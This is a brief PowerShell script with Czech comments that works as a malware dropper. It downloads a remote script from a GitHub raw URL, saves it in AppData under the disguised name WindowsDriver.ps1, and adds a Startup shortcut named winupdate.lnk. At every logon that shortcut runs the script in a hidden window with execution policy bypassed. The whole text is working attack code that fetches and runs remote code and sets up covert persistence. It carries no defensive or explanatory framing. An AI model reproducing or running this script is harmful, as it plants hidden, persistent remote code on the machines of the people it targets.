# 1. Stáhni payload
$payloadUrl = "https://raw.githubusercontent.com/JiriWeiss/Vecra/main/Vecra1.ps1" 
$localPath = "$env:APPDATA\WindowsDriver.ps1"
Invoke-WebRequest -Uri $payloadUrl -OutFile $localPath

# 2. Nastav persistenci (např. pomocí Scheduled Task)
$shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.lnk"
$wsh = New-Object -ComObject WScript.Shell
$shortcut = $wsh.CreateShortcut($shortcutPath)
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localPath`""
$shortcut.Save()

